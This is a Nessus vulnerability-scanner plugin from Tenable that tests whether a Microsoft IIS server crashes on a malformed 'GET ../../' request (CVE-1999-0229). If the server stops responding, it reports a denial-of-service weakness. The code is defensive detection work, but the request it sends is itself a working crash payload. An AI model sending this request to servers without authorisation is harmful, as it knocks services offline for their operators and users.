#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(10117);
  script_version("1.35");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-1999-0229");
  script_bugtraq_id(2218);

  script_name(english:"Microsoft IIS Traversal GET Request Remote DoS");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server is vulnerable to a Denial of Service attack");
  script_set_attribute(attribute:"description", value:
"It is possible to crash IIS by sending the request GET ../../'");
  script_set_attribute(attribute:"solution", value:
"Upgrade to the latest version.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"plugin_publication_date", value:"1999/06/22");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:microsoft:iis");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_DENIAL);
  script_family(english:"Web Servers");

  script_copyright(english:"This script is Copyright (C) 1999-2022 Tenable Network Security, Inc.");

  script_dependencies("find_service1.nasl", "http_version.nasl", "www_fingerprinting_hmap.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}

# The attack starts here
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
 
port = get_http_port(default:80, embedded: 0);

banner = get_http_banner(port: port);
if ("IIS" >!< banner) exit(0);
if(http_is_dead(port: port)) exit(0);

r = http_send_recv_buf(port: port, data: 'GET ../../\r\n');
sleep(2);

if (http_is_dead(port: port, retry: 3)) security_warning(port);
